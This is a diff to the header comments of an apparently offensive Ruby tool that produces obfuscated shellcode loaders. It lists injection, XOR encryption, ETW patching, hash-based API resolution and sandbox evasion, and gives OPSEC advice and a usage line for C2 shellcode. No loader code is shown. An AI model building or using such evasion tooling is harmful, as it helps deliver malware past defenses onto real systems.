@@ -6,7 +6,7 @@
 # Features: 
 # > Shellcode injection into the memory of the current process (Ruby)
 # > Shellcode encryption (XOR)
-# > Script obfuscation (function and variable names are randomized + multiple encoding layer)
+# > Script obfuscation (randomized function and variable names + nested payloads with reflective loading)
 # > ETW bypass in user-mode (patching method / EtwEventWrite function)
 # > Dynamic API resolution (via GetProcAddress + hash-based API resolution)
 # > Basic sandbox detection and evasion (Terminates execution if a 'sleep acceleration' is detected)
@@ -14,7 +14,7 @@
 # OPSEC advice: remove all existing comments in this script before generating your obfuscated shellcode loader.
 # =================================================================================================================================================================
 # Usage (example):
-# + C:\path\Ruby-3.10.4> Ruby.exe .\Invoke-Ruby-ShellCodeLoader.rb ".\raw-C2-shellcode.txt" ".\obfuscated_shellcodeloader.rb"
+# + C:\path\Ruby-3.10.4> Ruby.exe .\Invoke-Ruby-ShellCodeLoader.rb ".\ruby-shellcode.bin" ".\obfuscated_shellcodeloader.rb"
 # =================================================================================================================================================================
 
 require 'fiddle'
